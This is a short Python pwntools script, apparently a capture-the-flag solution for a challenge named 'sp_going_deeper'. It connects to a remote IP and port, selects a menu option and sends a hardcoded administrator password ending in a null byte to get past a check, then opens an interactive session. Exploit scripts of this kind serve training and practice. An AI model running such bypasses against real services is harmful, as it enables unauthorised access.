#!/usr/bin/python3
from pwn import *

#r = process("./sp_going_deeper")
r = remote('142.93.40.191',30324)
r.recvuntil(">> ")
r.sendline(b'1')
print(r.recvline())
r.sendline(b'DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\0')
print(r.recvline())
r.interactive()
